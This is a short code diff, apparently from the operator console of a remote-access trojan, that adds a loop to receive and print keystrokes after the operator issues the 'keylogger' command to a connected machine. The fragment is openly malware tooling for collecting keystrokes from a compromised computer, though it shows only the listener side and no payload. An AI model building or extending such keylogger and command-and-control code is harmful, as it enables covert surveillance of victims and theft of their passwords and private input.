@@ -15,6 +15,11 @@ def send_command(sock):
         response=sock.recieve_data()
         print(response)
 
+def recieve_keys(sock):
+    while True:
+        response=sock.recieve_data()
+        print(response)
+
 def handler(sock):
     print("[+] Handler has started")
     print("tip: enter 'help' to see what you can do")
@@ -35,6 +40,7 @@ def handler(sock):
             break
         elif User_input=="keylogger":
             sock.send_data(User_input)
+            recieve_keys(sock)
         else:
             print("[+] Invalid input")
             options()
